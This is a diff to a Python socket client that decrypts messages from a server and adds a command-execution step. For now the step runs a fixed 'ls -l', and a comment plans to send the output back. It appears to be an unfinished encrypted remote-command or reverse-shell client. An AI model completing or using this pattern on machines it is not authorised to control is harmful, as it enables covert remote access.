@@ -14,17 +14,37 @@ def runClient():
         s.send(return_msg.encode())  # send message
         data = s.recv(1024).decode()  # receive response
 
-        print('Received from server: ' + data)  # show in terminal
+        #unpack message from data into recv_msg
+        recv_msg = data
+
+        print('Received from server: ' + recv_msg)  # show in terminal
+
         decrypted_data = ""
         try:
-            decrypted_data = decrypt(data,KEY)
+            decrypted_data = decrypt(recv_msg,KEY)
         except Exception as e:
             print('Error decrypting... ignoring packet')
             return_msg = "decryption error"
+            continue
         finally:
             pass
-        print('Decrypted: ' + decrypted_data)
-        return_msg = "ok"  # again take input
+
+        #try to execute the command
+        cmd_output = ""
+        try:
+        	rawout = subprocess.run(["ls", "-l"], capture_output=True)
+        except Exception as e:
+        	print('Error executing command... ignoring')
+        	return_msg = "command failed"
+        	continue
+        else:
+        	print(str(rawout.stdout,'utf-8'))
+        	pass
+        finally:
+        	pass
+
+        #send back output
+        return_msg = "ok"
 
     s.shutdown(socket.SHUT_RD)
     s.close()  # close the connection
